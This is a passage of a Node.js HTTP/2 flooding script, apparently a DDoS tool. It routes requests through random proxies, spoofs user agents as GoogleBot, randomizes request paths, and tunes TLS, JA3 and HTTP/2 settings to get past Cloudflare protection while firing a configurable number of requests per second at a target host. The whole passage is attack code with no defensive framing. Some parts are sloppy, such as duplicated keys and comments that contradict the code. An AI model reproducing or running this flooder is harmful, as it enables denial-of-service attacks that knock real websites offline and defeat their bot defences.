headers.randomMethod = " /HTTP/2"
headers["Clear-Site-Data"] = "cache" + "cookies";
headers["Sec-Websocket-Key"] = spoofed2;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["Server"] = randomHeaders["Server"];
headers["range"] = "bytes=0-499";
headers["downlink"] = "1.7";
headers["viewport-width"] = "1920";
headers["width"] = "1080";
headers["Accept-CH"] = "width";
headers["memory-device"] = "0.25";
headers["sss"] = spoofed;
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.1 header
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.2 header
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=7200" });   // Add the http/2 header 
headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":443; ma=7200" }); // Add the http/1.1 header with port 80
headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":443; ma=7200" }); // Add the http/1.2 header with port 80

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
     const userAgentv2 = new UserAgent();
      var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
	 headers[":authority"] = parsedTarget.host + ":443";
	 headers[":path"] = parsedTarget.path + pathx + randstr(10) + query + randstr(10) + ":443"; 
     headers["origin"] = "https://" + parsedTarget.host + ":443";
     headers["user-agent"] = uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return

let headers = {}

      
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            Compression: true,
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: false,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            secureOptions: secureOptions,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_3_method"],
            }

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
        tlsConn.setKeepAlive(true, 60000);
        
        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            protocol: "https:",
            settings: {
                headerTableSize: 4096, // Ukuran header table yang lebih kecil
                maxConcurrentStreams: 100, // Batasan jumlah stream yang lebih rendah
                initialWindowSize: 65535, // Ukuran awal window yang lebih kecil
                maxHeaderListSize: 8192, // Ukuran maksimum daftar header yang lebih kecil
                enablePush: true, // Push dinonaktifkan
            },
            maxSessionMemory: 64000, // Ukuran memori sesi yang lebih kecil
            maxDeflateDynamicTableSize: 4096, // Ukuran tabel deflate yang lebih kecil
            socket: connection,
        });
        
        client.settings({
            headerTableSize: 4096, // Ukuran header table yang lebih kecil
            maxConcurrentStreams: 100, // Batasan jumlah stream yang lebih rendah
            initialWindowSize: 65535, // Ukuran awal window yang lebih kecil
            maxHeaderListSize: 8192, // Ukuran maksimum daftar header yang lebih kecil
            enablePush: true, // Push dinonaktifkan
        });
        
 
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                           headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    headers["ja3"] = jar;
                  headers[":path"] = parsedTarget.path + pathx + randstr(10) + query + randstr(10) + ":443"; 
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        if(response['set-cookie']) {
                    headers["cookie"] = cookieString(scp.parse(response["set-cookie"]));
                                                               }
                        return
                    });
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);